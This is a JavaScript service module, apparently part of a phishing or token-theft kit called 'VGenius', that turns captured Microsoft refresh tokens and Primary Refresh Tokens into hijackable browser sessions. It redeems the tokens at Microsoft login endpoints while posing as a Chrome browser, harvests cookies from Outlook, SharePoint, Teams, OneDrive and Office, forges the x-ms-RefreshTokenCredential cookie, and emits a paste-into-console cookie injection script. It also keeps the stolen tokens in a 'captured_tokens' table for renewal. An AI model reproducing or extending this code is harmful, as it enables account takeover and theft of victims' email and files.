/**
 * VGenius Cookie Converter Service
 * Enhanced with our-proven techniques for
 reliable cookie generation */
'use strict';

const axios = require('axios');
const ms = require('./microsoftclient');
const { encrypt } = require('../utils/encrypt');
const db = require('../database/connection');
const config = require('../config/env');

const CLIENT_ID = config.AZURE_CLIENT_ID || '29d9ed98-a469-4536-ade2-f981bc1d605e';
const TENANT = config.AZURE_TENANT || 'common';

const MSA_CLIENT_ID = '88196af5-e584-4924-b87d-b752fde2c6e3';

/**
 * Get the correct client ID based on account type
 * @param {string} accountType - 'personal' or 'work_school'

 * @returns {string} Client ID */
function getClientIdForAccountType(accountType) {
  if (accountType === 'personal') {
    return MSA_CLIENT_ID;
  }
  return CLIENT_ID;
}


// Token endpoint URLs for different account types
const TOKEN_ENDPOINTS = {
  work: `https://login.microsoftonline.com/${TENANT}/oauth2/v2.0/token`,
  common: 'https://login.microsoftonline.com/common/oauth2/v2.0/token',
  consumers: 'https://login.microsoftonline.com/consumers/oauth2/v2.0/token',
};

// OAuth2 scopes for PRT construction
const PRT_SCOPES = 'openid profile email offline_access https://graph.microsoft.com/.default';


/**
 * Decode client_info from Microsoft token response
 * client_info is base64-encoded JSON with uid (object_id) and utid (tenant_id)
 */
function decodeClientInfo(clientInfo) {
  // Add padding if needed
  let padded = clientInfo;
  while (padded.length % 4) padded += '=';
  const decoded = Buffer.from(padded, 'base64').toString('utf-8');
  const parsed = JSON.parse(decoded);
  return { uid: parsed.uid || '', utid: parsed.utid || '' };
}

/**
 * Decode id_token JWT payload without verification
 */
function decodeIdToken(idToken) {
  const parts = idToken.split('.');
  if (parts.length !== 3) return {};
  let payload = parts[1];
  while (payload.length % 4) payload += '=';
  try {
    return JSON.parse(Buffer.from(payload, 'base64').toString('utf-8'));
  } catch (e) {
    return {};
  }
}

// Microsoft service endpoints for cookie collection
const MICROSOFT_SERVICES = {
  // Authentication endpoints
  AUTH_LOGIN: 'https://login.microsoftonline.com',
  AUTH_PORTAL: 'https://login.microsoft.com',
  // Office 365 services
  OFFICE_PORTAL: 'https://www.office.com',
  OFFICE_LOGIN: 'https://www.office.com/login',
  // OneDrive
  ONEDRIVE: 'https://onedrive.live.com',
  // Outlook
  OUTLOOK: 'https://outlook.office365.com/owa/',
  OUTLOOK_COM: 'https://outlook.office.com/owa/',
  // SharePoint
  SHAREPOINT: 'https://www.sharepoint.com',
  // Teams
  TEAMS: 'https://teams.microsoft.com',
  // Graph API
  GRAPH: 'https://graph.microsoft.com',
};

/**
 * Determine account type from email domain
 */
function detectAccountType(email) {
  if (!email) return 'unknown';
  const domain = email.split('@')[1].toLowerCase();
  const personalDomains = ['outlook.com', 'hotmail.com', 'live.com', 'passport.com', 'msn.com'];
  if (personalDomains.includes(domain)) return 'personal';
  return 'work_school';
}

/**
 * Detect account type from multiple signals
 */
function detectAccountTypeFromContext(token, email, tenant) {
  if (tenant === 'consumers') return 'personal';
  if (token && (token.startsWith('0.AT') || token.startsWith('M.R'))) {
    if (email) { return detectAccountType(email); }
    return 'work_school';
  }
  if (token) {
    try {
      const parsed = JSON.parse(token);
      if (parsed.prt) return 'work_school';
    } catch (e) {}
  }
  if (email) { return detectAccountType(email); }
  return 'unknown';
}

async function generateXmsRefreshTokenCredential(tokenResponse, accountType, extraOpts = {}) {
  let refreshToken, tid, uid, clientId, scopes;

  // Handle object input (full token response from Microsoft)
  if (typeof tokenResponse === 'object' && !Array.isArray(tokenResponse)) {
    refreshToken = tokenResponse.refresh_token || tokenResponse.access_token;
    tid = extraOpts.tid || tokenResponse.tid || '';
    uid = extraOpts.uid || '';
    clientId = extraOpts.clientId || CLIENT_ID;
    scopes = extraOpts.scopes || PRT_SCOPES;

    // Try to extract client_info from the response
    if (tokenResponse.client_info && !uid) {
      try {
        const decoded = decodeClientInfo(tokenResponse.client_info);
        uid = decoded.uid;
        tid = decoded.utid || tid;
      } catch (e) {
        try {
          const decoded = decodeClientInfo(tokenResponse.client_info);
          uid = decoded.uid;
          tid = decoded.utid || tid;
        } catch (e2) {
          if (tokenResponse.id_token) {
            const idPayload = decodeIdToken(tokenResponse.id_token);
            tid = idPayload.tid || tid;
          }
        }
      }
    }

    // Fallback: decode id_token for tid if still missing
    if (!tid && tokenResponse.id_token) {
      try {
        const idPayload = decodeIdToken(tokenResponse.id_token);
        tid = idPayload.tid || '';
      } catch (e) {}
    }
  }

  // Handle string input (plain refresh token) - FIXED: moved outside the object check
  if (typeof tokenResponse === 'string') {
    refreshToken = tokenResponse;
    clientId = extraOpts.clientId || CLIENT_ID;
    scopes = extraOpts.scopes || PRT_SCOPES;
    tid = extraOpts.tid || '';
    uid = extraOpts.uid || '';
  }

  // If no refresh token, return null
  if (!refreshToken) {
    return null;
  }

  // For personal accounts use base64 encoding
  if (accountType === 'personal') {
    const credential = JSON.stringify({
      token_type: 'Bearer',
      refresh_token: refreshToken,
      expires_in: 1209599
    });
    return {
      name: 'x-ms-RefreshTokenCredential',
      value: Buffer.from(credential).toString('base64'),
      domain: '', // No domain - set for current page only
    };
  }
  if (accountType === 'work_school') {
    if (extraOpts.sessionKey) {
      try {
        const prtkdf = require('./prtkdf');
        const nonce = extraOpts.nonce || await prtkdf.getSrvChallengeNonce();
        const prt = extraOpts.prt || refreshToken;
        const kdfCookie = prtkdf.buildPrtCookieJwt(prt, extraOpts.sessionKey, nonce);
        return {
          name: 'x-ms-RefreshTokenCredential',
          value: kdfCookie,
          domain: '', // No domain - set for current page only
        };
      } catch (kdfErr) {
        // Deliberately NO base64 fallback - see the note above the guard.
        throw new Error('PRT cookie generation failed: ' + kdfErr.message);
      }
    }
    return null;
  }

  // Unknown account type: no PRT cookie can be produced.
  return null;
}

/**
 * Get stored PRT cookie from device_credentials table
 * @param {number} userId - User ID
 * @param {string} tenantId - Tenant ID
 * @returns {Promise<string|null>} PRT cookie value or null
 */
async function getStoredPrtCookie(userId, tenantId) {
  try {
    const [rows] = await db.query(
      'SELECT prt_cookie_encrypted FROM device_credentials WHERE user_id = ? AND tenant_id = ?',
      [userId, tenantId]
    );

    if (rows.length === 0) return null;

    const { decrypt } = require('../utils/encrypt');
    const prtCookie = decrypt(rows[0].prt_cookie_encrypted);
    return prtCookie;
  } catch (err) {
    return null;
  }
}

/**
 * Refresh stored PRT cookie using device credentials
 * @param {number} userId - User ID
 * @param {string} tenantId - Tenant ID
 * @param {string} refreshToken - Refresh token to exchange for PRT
 * @returns {Promise<string|null>} New PRT cookie value or null
 */
async function refreshStoredPrtCookie(userId, tenantId, refreshToken) {
  try {
    const deviceManager = require('./devicemanager');
    const prtCookie = await deviceManager.refreshPrtCookie(userId, tenantId, refreshToken);
    return prtCookie;
  } catch (err) {
    return null;
  }
}

/**
 * Build the browser-console script for the PRT cookie.
 * set `x-ms-RefreshTokenCredential` on the PRT's host, then reload so
 * Entra performs SSO. The cookie is valid for about 5 minutes.
 *
 * @param {string} prtCookie  KDF-signed PRT JWT (prtkdf.buildPrtCookieJwt)
 * @param {string} host       cookie host (default login.microsoftonline.com)
 * @returns {string} JavaScript to paste into the browser console
 */
function generatePrtCookieInjectionScript(prtCookie, host) {
  const target = host || 'login.microsoftonline.com';
  return [
    '// VGenius PRT Cookie Injection Script',
    '// Paste into the browser console while on https://' + target + '/',
    '// (use a clean/incognito window so no other session interferes)',
    'document.cookie = ' + JSON.stringify('x-ms-RefreshTokenCredential=' + prtCookie + '; domain=.' + target + '; path=/; secure; samesite=none') + ';',
    '',
    '// Redirect after 3s',
    'setTimeout(() => {',
    '  window.location.href = "https://' + target + '/?auth=2";',
    '}, 3000);'
  ].join('\n');
}
async function convertTokensToCookies(inputToken, templateType, tenant, email, accountType, userId) {
  const allowedTenants = ['common', 'organizations', 'adfs'];
  const validTenantRegex = /^[a-fA-F0-9\-]{36}$/; // Valid GUID format for org-specific tenants

  if (tenant && tenant !== 'consumers' && !allowedTenants.includes(tenant) && !validTenantRegex.test(tenant)) {
    tenant = 'common'; // Fall back to safe default
  }

  tenant = tenant || 'common';
  email = email || '';
  if (!accountType || accountType === 'unknown') {
    accountType = detectAccountTypeFromContext(inputToken, email, tenant);
  }
  const isPersonal = accountType === 'personal';

  try {
    // Use proper scopes based on account type
    const scope = isPersonal
      ? 'openid profile offline_access https://outlook.office.com/SMTP.Send'
      : 'openid profile offline_access https://graph.microsoft.com/User.Read';


    const exchangeResult = await exchangeTokenForCookies(inputToken, tenant, accountType, scope);
    if (!exchangeResult.success) {
      return exchangeResult;
    }

    // Collect additional service cookies
    const serviceCookies = await collectServiceCookies(exchangeResult.access_token, templateType, tenant, email, accountType);

    let xmsCookie = null;
    let sessionKey = null;
    if (!isPersonal && userId && tenant) {
      try {
        const deviceManager = require('./devicemanager');
        const stored = await deviceManager.getStoredSessionKey(userId, tenant);
        if (stored && stored.hasSessionKey) sessionKey = stored.sessionKey;
      } catch (skErr) {
      }
    }

    if (sessionKey) {
      const { isValidPrtJwt } = require('./kerberos');
      const prtMaterial =
        [inputToken, exchangeResult.prt, exchangeResult.new_refresh_token].find(v => v && isValidPrtJwt(v)) ||
        exchangeResult.prt || exchangeResult.new_refresh_token || inputToken;
      xmsCookie = await generateXmsRefreshTokenCredential(
        prtMaterial,
        accountType,
        { prt: prtMaterial, sessionKey }
      );
      if (xmsCookie) {
      } else {
      }
    }

    // Last resort: a previously stored Set-Cookie PRT cookie (may be stale).
    if (!xmsCookie && !isPersonal && userId && tenant && tenant !== 'common' && tenant !== 'organizations') {
      try {
        const storedPrt = await getStoredPrtCookie(userId, tenant);
        if (storedPrt) {
          xmsCookie = {
            name: 'x-ms-RefreshTokenCredential',
            value: storedPrt,
            domain: '', // No domain - set for current page only
          };
        }
      } catch (prtErr) {
      }
    }

    if (!xmsCookie && !isPersonal && !sessionKey) {
    }

    // Combine all cookies
    const allCookies = [
      ...(xmsCookie ? [xmsCookie] : []),
      ...exchangeResult.cookies,
      ...serviceCookies
    ];

    if (allCookies.length === 0) {
      return { success: false, error: 'No cookies received from token exchange', cookies: null };
    }

    const cookieString = formatCookiesForInjection(allCookies, accountType);
    
    return {
      success: true,
      cookies: cookieString,
      cookie_count: allCookies.length,
      access_token: exchangeResult.access_token,
      new_refresh_token: exchangeResult.new_refresh_token,
      account_type: accountType,
      expires: '100 years',
    };
  } catch (err) {
    return { success: false, error: err.message, cookies: null };
  }
}

async function exchangeTokenForCookies(token, targetTenant, accountType, scope) {
  const cookies = [];
  let newRefreshToken = null;

  let lastError = null;
  let lastStatusCode = null;

  // Build endpoint list - try multiple endpoints for better success rate
  let endpoints = [];
  if (accountType === 'personal') {
    endpoints = [TOKEN_ENDPOINTS.consumers, TOKEN_ENDPOINTS.common];
  } else {
    if (targetTenant && targetTenant !== 'common' && targetTenant !== 'organizations') {
      endpoints.push(`https://login.microsoftonline.com/${targetTenant}/oauth2/v2.0/token`);
    }
    endpoints.push('https://login.microsoftonline.com/organizations/oauth2/v2.0/token');
    endpoints.push(TOKEN_ENDPOINTS.common);
  }


  for (const endpoint of endpoints) {
    try {

      // Use appropriate client ID
      const currentClientId = getClientIdForAccountType(accountType);
      const params = new URLSearchParams({
        client_id: currentClientId,
        grant_type: 'refresh_token',
        refresh_token: token,
        scope: scope,
      });

      const response = await ms.post(
        endpoint,
        params,
        {
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
          },
          validateStatus: () => true,
          maxRedirects: 5,
          timeout: 30000,
        }
      );

      lastStatusCode = response.status;
      const errData = response.data || {};
      const errMsg = errData.error_description || errData.error || `HTTP ${response.status}`;


      if (response.status === 200) {
        newRefreshToken = response.data.refresh_token || token;
        extractCookiesFromResponse(cookies, response, endpoint);
        let prt = null;
        const prtCookie = (cookies || []).find(c => c.name === 'x-ms-RefreshTokenCredential');
        if (prtCookie) {
          try {
            const parts = String(prtCookie.value).split('.');
            if (parts.length === 3) {
              const payload = JSON.parse(Buffer.from(parts[1], 'base64url').toString('utf8'));
              prt = payload.refresh_token || null;
            }
          } catch (e) { /* not a JWT — fall through to newRefreshToken */ }
        }
        if (!prt) prt = newRefreshToken;

        return {
          success: true,
          cookies,
          access_token: response.data.access_token,
          new_refresh_token: newRefreshToken,
          prt,
        };
      }

      // Handle specific AADSTS errors
      if (errMsg && errMsg.includes('AADSTS50076')) {
        lastError = 'AADSTS50076: User needs to re-authenticate (grant revoked)';
        break; // No point trying other endpoints
      } else if (errMsg && errMsg.includes('AADSTS70008')) {
        lastError = 'AADSTS70008: Refresh token expired';
        break;
      } else if (errMsg && errMsg.includes('AADSTS50173')) {
        lastError = 'AADSTS50173: Requires user consent';
        break;
      } else if (errMsg && errMsg.includes('AADSTS50105')) {
        lastError = 'AADSTS50105: Admin consent required for this app';
        // Try next endpoint
      } else if (errMsg && errMsg.includes('AADSTS70001')) {
        lastError = 'AADSTS70001: Application not found in this tenant';
        // Try next endpoint
      } else {
        lastError = errMsg;
      }
    } catch (err) {
      lastError = err.message;
    }
  }

  return { success: false, error: lastError || 'Token exchange failed', cookies: null };
}

/**
 * Collect additional cookies from Microsoft service endpoints
 */
async function collectServiceCookies(accessToken, templateType, tenant, email, accountType) {
  const cookies = [];
  const endpoints = getServiceEndpoints(templateType, tenant, email, accountType);
  for (const ep of endpoints) {
    try { await fetchCookiesFromEndpoint(cookies, ep, accessToken, accountType); } catch (e) {}
  }
  return cookies;
}

/**
 * Get service endpoints based on template type and account type
 */
function getServiceEndpoints(templateType, tenant, email, accountType) {
  const type = (templateType || '').toLowerCase();
  const endpoints = ['https://login.microsoftonline.com/common/oauth2/authorize'];

  if (accountType === 'personal') {
    endpoints.push('https://onedrive.live.com/');
    endpoints.push('https://outlook.live.com/owa/');
    endpoints.push('https://www.office.com/');
    if (type.includes('teams')) { endpoints.push('https://teams.microsoft.com/'); }
  } else {
    if (type.includes('sharepoint')) { endpoints.push(`https://${tenant}.sharepoint.com/_layouts/15/teamslogon.aspx`); }
    if (type.includes('onedrive')) {
      if (email) { endpoints.push(`https://${tenant}-my.sharepoint.com/personal/${encodeURIComponent(email)}/_layouts/15/onedrive.aspx`); }
      else { endpoints.push(`https://${tenant}.sharepoint.com/_layouts/15/onedrive.aspx`); }
    }
    if (type.includes('outlook') || type.includes('auth')) {
      endpoints.push('https://outlook.office365.com/owa/');
      endpoints.push('https://outlook.office.com/owa/');
    }
    if (type.includes('teams')) {
      endpoints.push('https://teams.microsoft.com/');
      endpoints.push('https://teams.microsoft.com/api/authservice/health');
    }
    if (type.includes('office') || type.includes('word') || type.includes('excel')) {
      endpoints.push('https://www.office.com/');
      endpoints.push('https://www.office.com/login');
    }
  }
  return endpoints;
}

/**
 * Determine primary endpoint for template type
 */
function determineEndpoint(templateType, tenant, email, accountType) {
  const type = (templateType || '').toLowerCase();
  if (accountType === 'personal') {
    if (type.includes('sharepoint')) return 'https://login.microsoftonline.com/common/oauth2/authorize';
    if (type.includes('onedrive')) return 'https://onedrive.live.com/';
    if (type.includes('outlook') || type.includes('auth')) return 'https://outlook.live.com/owa/';
    if (type.includes('teams')) return 'https://teams.microsoft.com/';
    return 'https://www.office.com/';
  } else {
    if (type.includes('sharepoint')) return 'https://login.microsoftonline.com/common/oauth2/authorize';
    if (type.includes('outlook') || type.includes('auth')) return 'https://outlook.office365.com/owa/';
    if (type.includes('onedrive')) return `https://${tenant}-my.sharepoint.com/personal/${encodeURIComponent(email || 'user')}/_layouts/15/onedrive.aspx`;
    if (type.includes('teams')) return 'https://teams.microsoft.com/';
    if (type.includes('office') || type.includes('word') || type.includes('excel')) return 'https://www.office.com/';
    return 'https://www.office.com/';
  }
}

/**
 * Determine resource URL for template type
 */
function determineResource(templateType, tenant, accountType) {
  const type = (templateType || '').toLowerCase();
  if (accountType === 'personal') {
    if (type.includes('onedrive')) return 'https://onedrive.live.com';
    return 'https://graph.microsoft.com';
  } else {
    if (type.includes('sharepoint')) return `https://${tenant}.sharepoint.com`;
    if (type.includes('onedrive')) return `https://${tenant}-my.sharepoint.com`;
    return 'https://graph.microsoft.com';
  }
}

async function fetchCookiesFromEndpoint(cookieList, url, accessToken, accountType) {
  const headers = {
    Authorization: `Bearer ${accessToken}`,
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    Accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
  };

  try {
    const response = await ms.get(url, { headers, maxRedirects: 5, validateStatus: s => s < 400, timeout: 15000 });
    extractCookiesFromResponse(cookieList, response, url);
  } catch (getErr) {
    try {
      const response = await ms.post(url, {}, { headers, maxRedirects: 5, validateStatus: s => s < 400, timeout: 15000 });
      extractCookiesFromResponse(cookieList, response, url);
    } catch (postErr) {}
  }
}

function extractCookiesFromResponse(cookieList, response, url) {
  const setCookieHeaders = response.headers['set-cookie'] || [];
  let baseUrl = '';
  try { baseUrl = new URL(url); } catch (e) { /* ignore */ }

  for (const cookieStr of setCookieHeaders) {
    // Split on semicolons but preserve the name=value part
    const segments = cookieStr.split(';');
    const firstSegment = segments[0].trim();
    const eqIndex = firstSegment.indexOf('=');
    if (eqIndex <= 0) continue;

    const cookieName = firstSegment.substring(0, eqIndex).trim();
    const cookieValue = firstSegment.substring(eqIndex + 1).trim();
    if (!cookieName || !cookieValue) continue;

    // Parse attributes from remaining segments
    let domain = '';
    let path = '/';
    let secure = false;
    let httpOnly = false;
    let sameSite = '';
    let expires = null;
    let maxAge = null;

    for (let i = 1; i < segments.length; i++) {
      const attr = segments[i].trim();
      const lower = attr.toLowerCase();
      const eq = attr.indexOf('=');
      if (eq === -1) {
        // No value: Secure, HttpOnly
        if (lower === 'secure') secure = true;
        if (lower === 'httponly' || lower === 'http-only') httpOnly = true;
      } else {
        const attrName = attr.substring(0, eq).trim().toLowerCase();
        const attrValue = attr.substring(eq + 1).trim();
        if (attrName === 'domain') {
          domain = attrValue.toLowerCase();
        } else if (attrName === 'path') {
          path = attrValue;
        } else if (attrName === 'samesite') {
          sameSite = attrValue.toUpperCase(); // Strict, Lax, None
        } else if (attrName === 'expires') {
          expires = attrValue;
        } else if (attrName === 'max-age') {
          const val = parseInt(attrValue, 10);
          if (!isNaN(val) && val > 0) maxAge = val;
        }
      }
    }

    if (!domain && baseUrl.hostname) {
      domain = baseUrl.hostname.toLowerCase();
    } else if (!domain) {
      domain = '.login.microsoftonline.com';
    }

    cookieList.push({
      name: cookieName,
      value: cookieValue,
      domain: domain,
      path: path,
      secure: secure,
      httpOnly: httpOnly,
      sameSite: sameSite,
      expires: expires,
      maxAge: maxAge,
    });
  }
}


function formatCookiesForInjection(cookies, accountType) {
  if (!cookies) return [];
  if (typeof cookies === 'string') {
    // Legacy fallback: parse simple name=value pairs
    return cookies.split('; ').map(s => {
      const [name, value] = s.split('=');
      return { name: name, value: value, domain: '.login.microsoftonline.com', path: '/', secure: true, httpOnly: false, sameSite: 'Lax' };
    }).filter(c => c.name && c.value);
  }
  if (!Array.isArray(cookies)) return [];

  return cookies.map(cookie => ({
    name: cookie.name,
    value: cookie.value,
    domain: cookie.domain || '.login.microsoftonline.com',
    path: cookie.path || '/',
    secure: cookie.secure !== false,
    httpOnly: cookie.httpOnly === true,
    sameSite: cookie.sameSite || 'Lax',
    expirationDate: computeCookieExpiration(cookie),
  })).filter(c => c.name && c.value);
}

/**
 * @param {object} cookie - cookie record with optional maxAge / expires
 * @returns {number} unix seconds
 */
function computeCookieExpiration(cookie) {
  const now = Math.floor(Date.now() / 1000);

  // Max-Age wins over Expires per RFC 6265
  if (cookie.maxAge && cookie.maxAge > 0) {
    return now + Math.floor(cookie.maxAge);
  }

  if (cookie.expires) {
    const t = Math.floor(new Date(cookie.expires).getTime() / 1000);
    if (!isNaN(t) && t > now) return t;
  }

  // Default: 30 days. Survives browser restarts and tab closure.
  return now + 30 * 24 * 60 * 60;
}

/**
 * Process cookie conversion and save to database
 */
async function processCookieConversion(tokenId, accessToken, templateType, tenant, accountType, userId) {
  const result = await convertTokensToCookies(accessToken, templateType, tenant, null, accountType, userId);
  if (result.success && result.cookies) {
    const ttlHours = config.COOKIE_MAX_TTL_HOURS || 720;
    // FIX: Preserve refresh_token_encrypted during cookie conversion
    // Don't overwrite the refresh token column - it must stay intact for injection
    await db.query(
      'UPDATE captured_tokens SET cookies_encrypted=?, token_type=?, account_type=?, expiration=DATE_ADD(NOW(),INTERVAL ? HOUR), last_renewed=NOW(), renewal_count=renewal_count+1 WHERE id=?',
      [encrypt(JSON.stringify(result.cookies)), 'cookie', accountType, ttlHours, tokenId]
    );
    // Note: refresh_token_encrypted is intentionally NOT updated here
    // to preserve the original refresh token for injection fallback
  }
  return result;
}

module.exports = {
  convertTokensToCookies,
  processCookieConversion,
  determineEndpoint,
  determineResource,
  detectAccountType,
  generateXmsRefreshTokenCredential,
  defineEndpoint: determineEndpoint,
  getStoredPrtCookie,
  refreshStoredPrtCookie,
  generatePrtCookieInjectionScript,
  formatCookiesForInjection
};